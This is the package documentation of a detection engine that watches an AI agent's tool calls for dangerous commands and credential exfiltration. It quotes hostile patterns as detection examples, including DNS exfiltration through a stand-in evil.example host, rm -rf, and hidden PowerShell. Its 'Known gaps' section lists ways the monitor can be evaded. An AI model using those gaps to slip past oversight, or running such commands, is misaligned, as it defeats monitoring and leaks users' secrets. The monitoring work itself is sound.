// Package rules is spoor's detection engine: a strict YAML rule language
// over the field view of internal/features, compiled into a Set, and an
// Engine that evaluates events with bounded per-session state.
//
// # Packs
//
// A pack is one YAML document:
//
//	pack: core
//	version: "2026.11.0"
//	rules:
//	  - id: SPR-EXEC-001
//	    title, description, kind (activity|inventory), class (signal|finding|alert),
//	    severity, confidence, maturity, category, tags, references, falsepositives,
//	    when, match, allow, flags {require, require_any, set, ttl, scope},
//	    threshold {count, window, by}, emit, escalate, response (none|ask|block),
//	    dedup, evidence, remedy, novelty {fields, raise}, tests
//
// Loading is strict: unknown keys, anchors, aliases, merge keys, custom
// tags, duplicate keys and second documents are errors; a pack is capped
// at 1 MiB and 500 rules; regular expressions are RE2, at most 1,000
// characters, and compile on first use; every rule needs at least one
// test. lists.yaml holds named lists ({lists: {name: [entries]}});
// suppressions.yaml holds operator exceptions ({suppressions: [{rule,
// match, expires, reason, tags}]}).
//
// The embedded packs are also shipped pre-parsed in packs/embedded.cache,
// because a guard-mode hook is a fresh process per tool call and YAML
// scanning was two thirds of its start-up (18 ms for 300 rules against a
// 15 ms budget). The cache is regenerated with `go generate
// ./internal/rules` after any change to packs/ or lists.yaml; it records a
// SHA-256 of the YAML it was made from, LoadEmbedded uses it only on a
// match and parses the YAML otherwise, and the package tests fail while it
// is stale. It is embedded rather than written to a user cache directory,
// which the guarded agent itself could write.
//
// Content served from the cache was compiled whole when the cache was
// made, so it is compiled lazily at run time (lazy.go): at load only each
// rule's stub (id, kind, response, flags, the when prefilter), everything
// Set, GuardSubset and NewEngine need; a rule's body when an engine first
// reaches it past its prefilter and flags (or Lint, RunTests, Rules ask);
// its inline tests only for a test run or the linter. The decoder
// validates every node at load but builds a rule's collection values
// (match, allow, tests, tags, ...) only on first use, and NewEngine leaves
// the content hash (Set.Hash, the rules_hash label) to the first
// detection. Measured with the 138 shipped rules in a fresh process on a
// shared 4-vCPU VM (minimum / median of 40): LoadEmbedded 11.5 / 14.8 ms
// before, 2.3 / 3.6 ms after; LoadEmbedded + GuardSubset + NewEngine + the
// first Eval 13.0 / 16.8 ms before, 4.6 / 5.5 ms after; the same with the
// full set 23.3 / 27.4 ms before (NewEngine alone 10.6 ms), 5.9 / 8.3 ms
// after (NewEngine 0.05 ms; the first Eval pays for the bodies it
// compiles). Content arriving at run time (LoadDir, Load, the YAML
// fallback) is always compiled whole, so it is rejected at load as before.
//
// # Predicates
//
// when, match and allow are predicate mappings. Several keys in one
// mapping are a conjunction; "all" and "any" take a list of mappings; "not"
// takes a mapping. A leaf is "field: value" (equality; a list value is
// any-of; on a list field, true when any element equals) or
// "field|modifier: value" with the modifiers contains, icontains,
// startswith, endswith, re (a list value is any-of; on a list field any
// element may match), in, contains_any, contains_all, in_list (every
// element of a list field must be listed, so one trusted host cannot vouch
// for another in the same command), any_in_list, gt, gte, lt, lte, exists,
// len_gt, cidr, any_startswith, any_endswith, any_re and any_contains. A
// missing field never matches, except "|exists: false"; empty strings and
// empty lists count as missing.
//
// Incomplete lists fail closed. features.Compute names every feature whose
// value lost entries to a size cap in content.truncated_fields (and sets
// shell.truncated for shell features). in_list on such a list is false,
// also inside any_command / any_install when the quantified feature is
// incomplete, because "every element is listed" cannot be shown for
// elements nobody saw: padding a command with listed hosts cannot push an
// unlisted one out of view. Rules can score the truncation itself through
// shell.truncated and content.truncated_fields.
//
// Two quantifiers bind several conditions to ONE item, which flat
// predicates over feature arrays cannot (measured: 3.3x to 3.6x
// over-matching on real sessions):
//
//	any_command: {name|in: [rm], args|contains_any: ["-rf", "-fr"], args|any_startswith: ["/", "~"]}
//	any_install: {manager: npm, exec: true, packages|any_re: "^@evil/"}
//
// any_command iterates shell.cmds (keys name, path, args, origin,
// dynamic); any_install iterates shell.install_entries (keys manager,
// packages, global, exec, flags).
//
// # Evaluation
//
// Rules are indexed by the event types their when block names, so an
// event is only matched against rules that can apply to it; activity rules
// see activity events, inventory rules inventory events. For each
// candidate: when, then flags.require / require_any against the session
// flags, then match, then allow (a hit vetoes the detection), then the
// threshold. A rule that fires sets its flags.set (with ttl, default 30m)
// even when emit is false; flags set by an event take effect for later
// events only, so results never depend on rule order.
//
// Flags are kept per (session, subagent thread): a flag set inside one
// subagent does not satisfy a requirement in another thread or in the
// parent, because subagents of one orchestrated session share a session
// id and one thread's untrusted input must not taint every other thread.
// A rule with flags.scope: session sets its flags session-wide and checks
// requirements against every thread.
//
// threshold {count, window, by} fires when count matches fall inside the
// window (0 = no window), counted per session, user or host, and then
// restarts the count. Per-user and per-host counters a session fed travel
// with its export, bound on import to the user or host of the session's
// next event (never to an identity read from the state file). Detections are deduplicated per (rule, session,
// dedup fields): repeats inside Options.SuppressFor (default 1h) are
// counted, and the next emission carries the count. For class alert the
// window is capped at 10 minutes and the key always includes the
// destination (hosts and paths), so suppressing one alert cannot silence
// the same rule against a different target. A novelty block may only add
// attention: a first sighting adds the tag spoor.first_seen and, with
// raise, lifts the class one level; a repeat never lowers anything.
//
// Result.Response is the strongest of none < ask < block among fired rules
// on tool.pre and prompt.submit (the only blockable types). When the
// per-event deadline (default 150 ms) expires with a guard rule still
// pending, the response is at least ask: a stalled evaluation is never an
// implicit allow. Eval never panics; an internal failure answers ask for
// an event a guard rule could have decided.
//
// Inventory rules (kind: inventory) produce posture.check failures instead
// of detections.
//
// # Session state and identity
//
// SessionKey hashes (Event.User.ID, Event.Agent.ID, Event.Session.ID). The
// user id must be what the caller established (the owner of the spool or
// transcript file), never a name from the payload. Per session the engine
// keeps flags, counters, dedup memory, the last 200 paths written by file
// tools, shell redirections and writing MCP tools (session.runs_written_file
// is set when a later command executes one of them), the shell facts of
// the last 16 scripts written by file tools (see "Scripts written, then
// run" below), and keyed
// fingerprints of credential values read from credential-class paths
// (session.secret_flow is set when one of those values, raw, URL-encoded,
// base64 or hex, appears in a later outbound command, URL or MCP argument).
// Host names are scanned label by label for DNS exfiltration (curl
// https://<hex>.evil.example/, dig, nslookup, ping): every label, labels
// over 63 bytes also in 63-byte pieces, runs of up to 16 consecutive pieces
// (512 bytes) joined, raw and decoded as hex, base64, base64url or base32,
// and runs of up to 16 whole labels with their dots, raw (a value with dots
// of its own, a JWT). A name with non-ASCII bytes is also scanned as IDNA
// processing hands it to the resolver (NFKC, and the ideographic,
// full-width and half-width full stops as '.'). The label pass runs after
// the token pass, shortest name first. A raw label counts only for values
// of 16 bytes or more that are credentials by format or by name; a value
// kept only for its entropy (a project ref, a bucket name) is often a
// legitimate subdomain, and a short one an ordinary label, so those count
// in a label only encoded. A run of labels that itself reads as a host name
// (ending in a top-level domain, or an IP address) is never matched raw: a
// host-valued setting under a secret-like name (SESSION_COOKIE_DOMAIN,
// AUTH0_DOMAIN) would otherwise match every subdomain of it.
// The outbound scan is bounded but not blind to padding: strings are
// scanned shortest first, a string over 64 KiB on its head and tail, only
// distinct candidates of a remembered value's length are fingerprinted,
// every step (useless label runs included) is charged to a per-event work
// budget (measured: about 25 ms), and the scan ends at half the per-event deadline
// so the rules always run; whenever a bound is hit
// session.secret_flow_truncated is set so a rule can treat the request as
// opaque. ExportSession and ImportSession move
// this state through a one-shot hook process; imported state is validated
// as hostile input and capped at 64 KiB. Ids the state keeps (tool-use ids,
// subagent ids, event ids) are stored verbatim only when they are valid
// UTF-8 of at most 64 bytes and as a digest otherwise, so the engine never
// exports state it would refuse to import.
//
// # Scripts written, then run
//
// A command written into a script by a file tool (Write, Edit, MultiEdit,
// apply_patch) and run in a later event is analysed when it is written:
// features.WrittenScripts gives the shell.* and net.* facts a shell event
// carrying the script's content would get (shell, PowerShell and cmd
// scripts in their dialect, csh and fish as POSIX shell; Python,
// JavaScript, Ruby, Perl, PHP and Lua as the program of an interpreter
// fed by a heredoc), inside the half of the event's deadline the session
// work may use, and the session keeps them per normalized path: 16
// scripts, 3 KiB of facts each, with the text of a script of at most 8 KiB
// that holds no credential (32 KiB of texts in all). When the memory is
// full the least valuable record goes first, oldest first among equals:
// facts no rule can match, then facts without a notable fact or a command
// a rule matches, then the rest, then scripts that send a remembered
// credential value. A write that replaces the file with non-script
// content or a patch that deletes it forgets it, a patch move carries it,
// and an edit is applied to the held text and the whole result analysed;
// without a held text the edit's new text adds to what is known
// (shell.inherited_kinds = edit_fragment on the run). The bounds of the
// facts shed what no rule of the engine matches first (scriptKeep: a
// command no any_command predicate of any rule holds for, a list value no
// leaf on its feature holds for), so a script padded with ordinary lines
// keeps the line a rule needs. Credentials in the facts are redacted (what
// classify finds by pattern or position, and any value the session
// remembers from a credential read), and a script that carries one is
// never held as text.
// When a later shell command or process.exec runs that path (./x.sh, sh
// x.sh, bash +x x.sh, bash < x.sh, cat x.sh | sh, source x.sh, python3
// x.py, node x.js, pwsh -File x.ps1, powershell -w hidden -ep bypass -File
// x.ps1, through sudo, env, timeout and cd), the facts are merged into the
// executing event before matching (features.Inherit), so the parsed-fact
// rules fire on "sh /tmp/x.sh" as they would on its content, scripts run
// by the script included. Detections on such an event carry
// shell.inherited_kinds = written_script and session.written_exec_path in
// their evidence, and a guard reason names the script. A path counts as
// run only when it is the command word or the script argument of an
// interpreter, or a file a redirect or a plain reader (cat) hands to a
// line where an interpreter reads its program from standard input (sh,
// bash -s, python3 -, pwsh -Command -): chmod targets, syntax checks (sh
// -n, node --check, perl -c, php -l) and a file handed to a program as
// data (python3 -c code x.py, python3 - x.py) do not inherit, although
// they still set session.runs_written_file as before. A script that sends
// a credential value remembered from an earlier read is scanned when it is
// written; running it sets session.secret_flow, also when the same event
// is evaluated again on newer state. Nothing is read from disk: what is
// known about a file is what the agent's file tools wrote into it.
//
// # Operator suppressions
//
// A suppression applies when its rule glob matches and every match entry
// holds. On a list field every element must match the glob ("field|any"
// accepts one matching element), so an exception written for a trusted
// destination does not silence the same rule when an untrusted destination
// rides along; a list named in content.truncated_fields never matches.
//
// # Known gaps
//
//   - The data-flow rule follows secret VALUES read from secret-class
//     paths. Private data read through an approved MCP tool and written to
//     a public sink through MCP touches no secret path and is only covered
//     by a signal-class co-occurrence rule.
//   - The value must be a whole label or a run of whole labels: one
//     embedded with other characters inside a label (x1-<hex>.evil), split
//     over several commands or queries, or built at run time ($(xxd -p f))
//     is not matched; values of more than 4 KiB are not fingerprinted. A
//     dotted value that reads as a host name (a password such as
//     correct.horse.battery.staple) counts in a host name only encoded.
//     Many distinct padding names shorter than the carrying name can spend
//     the work or candidate budget first; the request is then marked
//     truncated, not clean.
//   - Session state of a daemonless hook lives in a file the monitored user
//     can write; code running as that user can clear its own flags.
//   - Content hidden behind runtime assembly (eval of built strings,
//     interpreter one-liners) is scored by shell.opaque, not seen through.
//     Write-then-run is seen through only for scripts written by file
//     tools in the same session: a script written by a shell redirect or
//     heredoc (cat > x.sh <<EOF), downloaded, unpacked from an archive,
//     copied or renamed by a shell command (cp, mv), changed by an editor
//     outside the agent, or written in another session is known only as a
//     written path (session.runs_written_file) or not at all. A document,
//     data or source extension (.md, .json, .go ...) without a #! line is
//     not analysed, so "sh notes.md" inherits nothing. The facts of one
//     script are bounded: when the commands a rule matches alone exceed
//     3 KiB, or a list holds more than 64 values a rule matches, the
//     middle of them is cut (recorded in content.truncated_fields); the
//     order is decided by the rules loaded when the script was written. A
//     script over 128 KiB is analysed on its first and last 64 KiB, and
//     once the event's budget is spent (a large write whose content scan
//     is slow) only its first piece and last 8 KiB are; the rest is
//     recorded as incomplete (shell.truncated), not seen. An edit of a file
//     whose text is not held (longer than 8 KiB, holding a credential,
//     written in another session or before the memory evicted it) is
//     analysed apart from the line it lands in: the run carries
//     shell.inherited_kinds = edit_fragment. More than 16 scripts of equal
//     value between the write and the run evict the first, and a one-shot
//     hook process's 64 KiB state sheds held texts, then the oldest
//     scripts, when it is full. A relative path run after a cd that cannot
//     be resolved statically (cd "$dir") is resolved against the session's
//     working directory only. A file handed to a line on standard input
//     counts as run when any interpreter on the line reads its program
//     from there (wc -l < x.sh; bash counts).
//   - Novelty baselines are in memory unless Options.Baseline is set, so in
//     a one-shot hook process every sighting is a first sighting.
//
// # Linting
//
// Lint reports what the loader accepts but review must not: unknown field
// names (validated against features.Registry), literals outside a closed
// vocabulary, type mismatches, unknown lists, text matching
// (re/contains/icontains/startswith/endswith, their any_* forms, and
// in_list/any_in_list, whose entries may be prefix globs) on
// target.command, alert
// rules with fewer than two negative tests, responses on non-blockable
// types, response: block in an embedded pack, duplicate ids and rules with
// no effect.
package rules
